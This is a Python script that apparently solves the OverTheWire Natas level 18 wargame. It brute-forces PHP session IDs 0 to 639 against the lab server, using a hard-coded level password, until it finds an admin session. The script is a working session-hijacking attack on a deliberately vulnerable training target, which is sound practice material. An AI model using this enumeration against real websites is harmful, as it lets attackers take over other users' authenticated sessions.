
import requests
from requests.auth import HTTPBasicAuth

import string
import time
import base64

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "http://natas18.natas.labs.overthewire.org"
data ={'username':""}
params = {'debug':'', 'username':'admin', 'password':'123'}

auth_username = "natas18"
auth_password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr       "
headers = {"authorization":'Basic {0}'.format(base64.b64encode((auth_username+':'+auth_password).encode('utf8')).decode())}
cookies = {'PHPSESSID':''}

for i in range(640):
    cookies['PHPSESSID'] = str(i)
    print(i)

    response = requests.get(URL,headers=headers, cookies=cookies)
    print(response.text)
    if "You are an admin" in response.text:
        print(response.text)
        break
